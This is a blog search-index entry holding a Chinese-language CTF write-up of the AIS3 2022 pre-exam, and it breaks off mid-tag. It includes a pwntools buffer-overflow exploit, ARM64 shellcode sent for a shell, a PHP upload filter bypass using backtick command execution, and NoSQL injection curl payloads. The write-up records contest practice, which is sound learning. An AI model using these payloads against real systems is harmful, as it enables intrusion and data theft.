<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>AIS3 2022 Pre-exam</title>
      <link href="/2022/07/04/AIS3-2022-Pre-exam/"/>
      <url>/2022/07/04/AIS3-2022-Pre-exam/</url>
      
        <content type="html"><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p><img src="https://hackmd.io/_uploads/BytnBp-Dq.png"></p><p>今年打 <a href="https://ais3.org/">AIS3 的 Pre-exam</a>，這次總共解了 8 題（不包括 Welcome），剩下的題目的解法有些是參考別人的 writeup</p><p><a href="https://jeff14994.github.io/2022/07/04/AIS3-2022-Pre-exam/" target="_self">Read More →</a></p><span id="more"></span><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="[Pwn]"></a>[Pwn]</h2><h3 id="BOF2WIN"><a href="#BOF2WIN" class="headerlink" title="BOF2WIN"></a><code>BOF2WIN</code></h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s!\n&quot;</span>, v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到第 8 行有 <code>gets</code> 漏洞，不會檢查邊界，因此可以 Buffer overflow 並控制 RIP<br>而 RIP 要跳到哪一個地址？在看過 IDA Pro 後可以發現到 <code>get_the_flag()</code> 的函式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_the_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">7</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">  fd = open(<span class="string">&quot;/home/bof2win/flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以透過<code>get_the_flag()</code> 的組合語言模式來找該記憶體位置，記憶體位置在 <code>0x401216</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000401216</span> F3 <span class="number">0F</span> <span class="number">1</span>E FA             endbr64</span><br><span class="line">.text:<span class="number">000000000040121</span>A <span class="number">55</span>                      push    rbp</span><br><span class="line">.text:<span class="number">000000000040121B</span> <span class="number">48</span> <span class="number">89</span> E5                mov     rbp, rsp</span><br><span class="line">.text:<span class="number">000000000040121</span>E <span class="number">48</span> <span class="number">83</span> EC <span class="number">40</span>             sub     rsp, <span class="number">40</span>h</span><br><span class="line">.text:<span class="number">0000000000401222</span> <span class="number">48</span> C7 <span class="number">45</span> C0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov     [rbp+buf], <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000000040122</span>A <span class="number">48</span> C7 <span class="number">45</span> C8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov     [rbp+var_38], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401232</span> <span class="number">48</span> C7 <span class="number">45</span> D0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov     [rbp+var_30], <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000000040123</span>A <span class="number">48</span> C7 <span class="number">45</span> D8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov     [rbp+var_28], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401242</span> <span class="number">48</span> C7 <span class="number">45</span> E0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov     [rbp+var_20], <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000000040124</span>A <span class="number">48</span> C7 <span class="number">45</span> E8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov     [rbp+var_18], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401252</span> BE <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     esi, <span class="number">0</span>          ; oflag</span><br><span class="line">.text:<span class="number">0000000000401257</span> <span class="number">48</span> <span class="number">8</span>D <span class="number">3</span>D A6 <span class="number">0</span>D <span class="number">00</span> <span class="number">00</span>    lea     rdi, file       ; <span class="string">&quot;/home/bof2win/flag&quot;</span></span><br><span class="line">.text:<span class="number">000000000040125</span>E B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401263</span> E8 B8 FE FF FF          call    _open</span><br></pre></td></tr></table></figure><h4 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code:"></a>Exploit Code:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(log_level=<span class="string">&#x27;info&#x27;</span>)</span><br><span class="line">padding = cyclic_find(<span class="string">&quot;gaaa&quot;</span>)</span><br><span class="line">usefulFunction_adr = <span class="number">0x401216</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;chals1.ais3.org&quot;</span>, <span class="number">12347</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = gdb.debug(&quot;./bof2win&quot;, gdbscript=gdbscript)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(padding)</span></span><br><span class="line"><span class="comment">#  1 - Fill the padding</span></span><br><span class="line">padding = <span class="string">&quot;A&quot;</span> * padding</span><br><span class="line"><span class="comment">#payload = padding.encode()</span></span><br><span class="line">payload = padding</span><br><span class="line">payload += p64(usefulFunction_adr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h4><p><img src="https://hackmd.io/_uploads/SJVXSRZvc.png"></p><h4 id="Got-flag-AIS3-Re-1-B0F-m4st3r"><a href="#Got-flag-AIS3-Re-1-B0F-m4st3r" class="headerlink" title="Got flag: AIS3{Re@1_B0F_m4st3r!!}"></a>Got flag: <code>AIS3&#123;Re@1_B0F_m4st3r!!&#125;</code></h4><h3 id="SAAS-Crash"><a href="#SAAS-Crash" class="headerlink" title="SAAS - Crash"></a><code>SAAS - Crash</code></h3><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>Heap 的 double free attack (有點半矇到, 但 flag is flag lol)</p><h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><p><img src="https://hackmd.io/_uploads/BJk_9abw5.png"></p><h4 id="Got-flag-AIS3-congrats-on-crashing-my-editor-but-can-you-get-shell-from-it"><a href="#Got-flag-AIS3-congrats-on-crashing-my-editor-but-can-you-get-shell-from-it" class="headerlink" title="Got flag: AIS3{congrats_on_crashing_my_editor!_but_can_you_get_shell_from_it?}"></a>Got flag: <code>AIS3&#123;congrats_on_crashing_my_editor!_but_can_you_get_shell_from_it?&#125;</code></h4><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="[Reverse]"></a>[Reverse]</h2><h3 id="Time-Management"><a href="#Time-Management" class="headerlink" title="Time Management"></a><code>Time Management</code></h3><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>一看到題目是 time management，我第一直覺是 <code>sleep()</code>，剛好在題目裡也有看到，所以就特別留意</p><p>丟進 IDA Decompile 完，可以看到第 13 行有一個 <code>sleep(0x8763)</code>，會造成整個程式卡住，因此我想說能否 patch 掉這個函式？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">nt __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hope you have enough time to receive my flag:&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; i += <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *(_DWORD *)&amp;secret[<span class="number">4</span> * i] ^ key[*(<span class="type">unsigned</span> <span class="type">int</span> *)&amp;secret[<span class="number">4</span> * i + <span class="number">4</span>]];</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      sleep(<span class="number">0x8763</span>u);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, v4);</span><br><span class="line">      v4 &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">      fflush(_bss_start);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\rOops! Where is the flag? I am sure that the flag is already printed!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根據 IDA 發現 sleep 的 offset 在 <code>0x122B</code> ，該 instruction code 是 <code>BF 63 87 00 00 E8 7B FE FF FF</code>，透過 010 Editor 便可以 patch 掉</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000000122B</span>                         loc_122B:               ; seconds</span><br><span class="line">.text:<span class="number">000000000000122B</span> BF <span class="number">63</span> <span class="number">87</span> <span class="number">00</span> <span class="number">00</span>          mov     edi, <span class="number">8763</span>h</span><br><span class="line">.text:<span class="number">0000000000001230</span> E8 <span class="number">7B</span> FE FF FF          call    _sleep</span><br></pre></td></tr></table></figure><p>patch 完後長這樣</p><p><img src="https://hackmd.io/_uploads/SJISM0Zvc.png"></p><h4 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h4><p>接著再把它丟回 <code>gdb</code>，設斷點在 <code>printf</code>，每次 4 個 byte 從 <code>RSI</code> 的把 flag leak 出來</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">jeff14994@jeff14994-VirtualBox:~/Desktop/AIS3<span class="number">-2022</span>/reverse/management_time$ gdb ./fixed_chal</span><br><span class="line">GNU <span class="title function_">gdb</span> <span class="params">(Ubuntu <span class="number">8.3</span><span class="number">-0u</span>buntu1)</span> 8.3</span><br><span class="line">gef➤  b <span class="built_in">printf</span></span><br><span class="line">Breakpoint 1 at 0x1090</span><br><span class="line">[ Legend: Modified <span class="keyword">register</span> | Code | Heap | Stack | String ]</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$rax   : 0x0</span><br><span class="line">$rbx   : 0x0</span><br><span class="line">$rcx   : 0x2c</span><br><span class="line">$rdx   : 0x454b4146</span><br><span class="line">$rsp   : 0x007fffffffe128  →  0x0055555555524b  →  &lt;main+162&gt; mov eax, DWORD PTR [rbp-0xc]</span><br><span class="line">$rbp   : 0x007fffffffe140  →  0x00555555555290  →  &lt;__libc_csu_init+0&gt; endbr64</span><br><span class="line">$rsi   : 0x33534941</span><br><span class="line">$rdi   : 0x005555555560de  →  0<span class="title function_">x00000000006325</span> <span class="params">(<span class="string">&quot;%c&quot;</span>?)</span></span><br><span class="line">$rip   : 0x007ffff7e24d70  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span><br><span class="line">$r8    : 0x2e</span><br><span class="line">$r9    : 0x7c</span><br><span class="line">$r10   : 0x007ffff7faabe0  →  0x005555555596a0  →  0x0000000000000000</span><br><span class="line">$r11   : 0x246</span><br><span class="line">$r12   : 0x005555555550c0  →  &lt;_start+0&gt; endbr64</span><br><span class="line">$r13   : 0x007fffffffe220  →  0x0000000000000001</span><br><span class="line">$r14   : 0x0</span><br><span class="line">$r15   : 0x0</span><br><span class="line">$eflags: [zero CARRY parity ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── <span class="built_in">stack</span> ────</span><br><span class="line">0x007fffffffe128│+0x0000: 0x0055555555524b  →  &lt;main+162&gt; mov eax, DWORD PTR [rbp-0xc] ← $rsp</span><br><span class="line">0x007fffffffe130│+0x0008: 0x33534941ffffe220</span><br><span class="line">0x007fffffffe138│+0x0010: 0x0000000000000000</span><br><span class="line">0x007fffffffe140│+0x0018: 0x00555555555290  →  &lt;__libc_csu_init+0&gt; endbr64  ← $rbp</span><br><span class="line">0x007fffffffe148│+0x0020: 0x007ffff7de71e3  →  &lt;__libc_start_main+243&gt; mov edi, eax</span><br><span class="line">0x007fffffffe150│+0x0028: 0x0000000000000000</span><br><span class="line">0x007fffffffe158│+0x0030: 0x007fffffffe228  →  0x007fffffffe4e6  →  &quot;/home/jeff14994/Desktop/AIS3-2022/reverse/manageme[...]&quot;</span><br><span class="line">0x007fffffffe160│+0x0038: 0x0000000100040000</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7ffff7e24d61 &lt;<span class="built_in">fprintf</span>+177&gt;    ret</span><br><span class="line">   0x7ffff7e24d62 &lt;<span class="built_in">fprintf</span>+178&gt;    call   0x7ffff7ef2d60 &lt;__stack_chk_fail&gt;</span><br><span class="line">   0x7ffff7e24d67                  nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line"> → 0x7ffff7e24d70 &lt;<span class="built_in">printf</span>+0&gt;       endbr64</span><br><span class="line">   0x7ffff7e24d74 &lt;<span class="built_in">printf</span>+4&gt;       sub    rsp, 0xd8</span><br><span class="line">   0x7ffff7e24d7b &lt;<span class="built_in">printf</span>+11&gt;      mov    r10, rdi</span><br><span class="line">   0x7ffff7e24d7e &lt;<span class="built_in">printf</span>+14&gt;      mov    QWORD PTR [rsp+0x28], rsi</span><br><span class="line">   0x7ffff7e24d83 &lt;<span class="built_in">printf</span>+19&gt;      mov    QWORD PTR [rsp+0x30], rdx</span><br><span class="line">   0x7ffff7e24d88 &lt;<span class="built_in">printf</span>+24&gt;      mov    QWORD PTR [rsp+0x38], rcx</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;fixed_chal&quot;, stopped 0x7ffff7e24d70 in __<span class="title function_">printf</span> <span class="params">()</span>, reason: BREAKPOINT</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x7ffff7e24d70 → __<span class="title function_">printf</span><span class="params">(format=<span class="number">0x5555555560de</span> <span class="string">&quot;%c&quot;</span>)</span></span><br><span class="line">[#1] 0x55555555524b → <span class="title function_">main</span><span class="params">()</span></span><br></pre></td></tr></table></figure><p>接著再重組散亂的 flag<br><img src="https://hackmd.io/_uploads/HkZKzAbwq.png"></p><h4 id="Got-flag-AIS3-You-are-the-master-of-time-management"><a href="#Got-flag-AIS3-You-are-the-master-of-time-management" class="headerlink" title="Got flag: AIS3{You_are_the_master_of_time_management!!!!!}"></a>Got flag: <code>AIS3&#123;You_are_the_master_of_time_management!!!!!&#125;</code></h4><h3 id="Give-Me-SC"><a href="#Give-Me-SC" class="headerlink" title="Give Me SC"></a>Give Me SC</h3><p>要給 <a href="https://www.exploit-db.com/exploits/47048">ARM64 的 shellcode</a></p><h4 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">shellcode = <span class="string">b&quot;\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">15566</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;omg&quot;</span>.encode())</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="Result-1"><a href="#Result-1" class="headerlink" title="Result"></a>Result</h4><p><img src="https://hackmd.io/_uploads/SkfzFQys5.png"></p><h2 id="Web"><a href="#Web" class="headerlink" title="[Web]"></a>[Web]</h2><h3 id="Poking-Bear"><a href="#Poking-Bear" class="headerlink" title="Poking Bear"></a><code>Poking Bear</code></h3><p>根據我觀察到的規律，解答有可能在 endpoint <code>350 - 777</code> 的區間，可以戳出圖案。但不確定是哪一個，所以我使用 Burp Suite 來猜，結過發現 <code>499</code> 的 response 跟其他人的不同<br><img src="https://hackmd.io/_uploads/rJt8rR-Pq.png"></p><p>在 <code>499</code> 發現 SECRET BEAR<br><img src="https://hackmd.io/_uploads/ryK8rRbD5.png"></p><p>發現會驗證 Cookie，因此把 Value 改成 <code>&quot;bear poker&quot;</code> 就可以拿到 flag<br><img src="https://hackmd.io/_uploads/H15IH0-v9.png"></p><h4 id="Result-2"><a href="#Result-2" class="headerlink" title="Result"></a>Result</h4><p><img src="https://hackmd.io/_uploads/BkYLrRWPq.png"></p><h4 id="Got-flag-AIS3-y0u-P0l3-7h3-Bear-H-rdLy-lt"><a href="#Got-flag-AIS3-y0u-P0l3-7h3-Bear-H-rdLy-lt" class="headerlink" title="Got flag: AIS3{y0u_P0l3_7h3_Bear_H@rdLy&lt;}"></a>Got flag: <code>AIS3&#123;y0u_P0l3_7h3_Bear_H@rdLy&lt;&#125;</code></h4><h3 id="Simple-File-Uploader"><a href="#Simple-File-Uploader" class="headerlink" title="Simple File Uploader"></a><code>Simple File Uploader</code></h3><h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><p>是 PHP 的題目，但我忘記存它的 source code。我記得它會先驗證 file extension (使用 php, php5 等等會被 block)，接著驗證裡面的內容（使用黑名單，使用 eval(), passthru() 等等的函式會被 block），上傳完就會拿到 <code>/upload/xxx.php</code> 來執行你上傳的程式</p><p>我試了很多次，不過我就只講成功的那一次</p><ol><li>Bypass 副檔名 <code>.PHp</code></li><li>Bypass 內容驗證 <code>echo `[arbitrary command]`;</code><h4 id="Exploit-Code-1"><a href="#Exploit-Code-1" class="headerlink" title="Exploit Code"></a>Exploit Code</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">檔名 exploit.PHp</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#echo `ls /`;</span></span><br><span class="line"><span class="keyword">echo</span> `/rUn_M3_t0_9et_fL4g`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>使用 <code>ls</code> 看到的內容，發現有一個 <code>rUn_M3_t0_9et_fL4g</code> &#x3D;&gt; run me to get flag<br><img src="https://hackmd.io/_uploads/H17OFCbv5.png"></li></ol><p>執行完 <code>/rUn_M3_t0_9et_fL4g</code><br><img src="https://hackmd.io/_uploads/HJ-FtCZwc.png"></p><h4 id="Got-flag-AIS3-H3yyyyyyyy-U-g0t-mi٩-ˊᗜˋ-و"><a href="#Got-flag-AIS3-H3yyyyyyyy-U-g0t-mi٩-ˊᗜˋ-و" class="headerlink" title="Got flag: AIS3{H3yyyyyyyy_U_g0t_mi٩(ˊᗜˋ*)و}"></a>Got flag: <code>AIS3&#123;H3yyyyyyyy_U_g0t_mi٩(ˊᗜˋ*)و&#125;</code></h4><h3 id="the-best-login-ui"><a href="#the-best-login-ui" class="headerlink" title="the_best_login_ui"></a>the_best_login_ui</h3><h4 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br></pre></td></tr></table></figure><p>可以透過 <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">no_sql injection</a> 進行 data leaking</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">curl 127.0.0.1:54088/login -d <span class="string">&#x27;username=admin&amp;password[$regex]=.&#123;41&#125;&#x27;</span></span><br><span class="line"><span class="comment"># Result: Success owo!</span></span><br><span class="line"></span><br><span class="line">curl 127.0.0.1:54088/login -d <span class="string">&#x27;username=admin&amp;password[$regex]=.&#123;42&#125;&#x27;</span></span><br><span class="line"><span class="comment"># Result: Failed qwq</span></span><br><span class="line"><span class="comment"># 可以知道 flag 長度是 41</span></span><br><span class="line"></span><br><span class="line">curl 127.0.0.1:54088/login -d <span class="string">&#x27;username[$ne]=toto&amp;password[$regex]=AIS3&#123;B.&#123;35&#125;&#x27;</span></span><br><span class="line"><span class="comment"># Result: Success owo!</span></span><br><span class="line"><span class="comment"># 可以透過 $regex 進行抹一個字元的 leak</span></span><br><span class="line"><span class="comment"># 注意有特殊字元，記得逃脫</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="[Crypto]"></a>[Crypto]</h2><h3 id="SC"><a href="#SC" class="headerlink" title="SC"></a><code>SC</code></h3><h4 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h4><p>看到關鍵字 <code>Substitution cipher</code>，想說看網路上有沒有現成的工具可以解，結果發現沒有，所以最後自幹。用紙筆大概解了 30-40 分鐘，中間有幾次把 <code>0</code> 當成 <code>O</code>差點解不出來</p><h4 id="密文-x3D-gt-要想辦法找到對應的-key-轉回明文"><a href="#密文-x3D-gt-要想辦法找到對應的-key-轉回明文" class="headerlink" title="密文 &#x3D;&gt; 要想辦法找到對應的 key 轉回明文"></a>密文 &#x3D;&gt; 要想辦法找到對應的 key 轉回明文</h4><p><code>5xvJ&#123;IVnCDwT_I24t6W626DVw_ODPzJi_FDMz_awVFw_PWmDw6J86_m66cOa&#125;</code></p><h4 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h4><p>加密過程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shuffle</span>(<span class="params">x</span>):</span><br><span class="line">    x = <span class="built_in">list</span>(x)</span><br><span class="line">    random.shuffle(x)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">T, file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file) <span class="keyword">as</span> f:</span><br><span class="line">        pt = f.read()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;file&#125;</span>.enc&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(pt.translate(T))</span><br><span class="line"></span><br><span class="line">charset = string.ascii_lowercase + string.ascii_uppercase + string.digits</span><br><span class="line">shuffled = <span class="string">&quot;&quot;</span>.join(shuffle(charset))</span><br><span class="line">T = <span class="built_in">str</span>.maketrans(charset, shuffled)</span><br><span class="line"></span><br><span class="line">encrypt(T, <span class="string">&quot;flag.txt&quot;</span>)</span><br><span class="line">encrypt(T, __file__)</span><br></pre></td></tr></table></figure><h4 id="自幹筆記"><a href="#自幹筆記" class="headerlink" title="自幹筆記"></a>自幹筆記</h4><p>一左一右找對應（從 <code>[0-9A-Za-z]</code>）<br><img 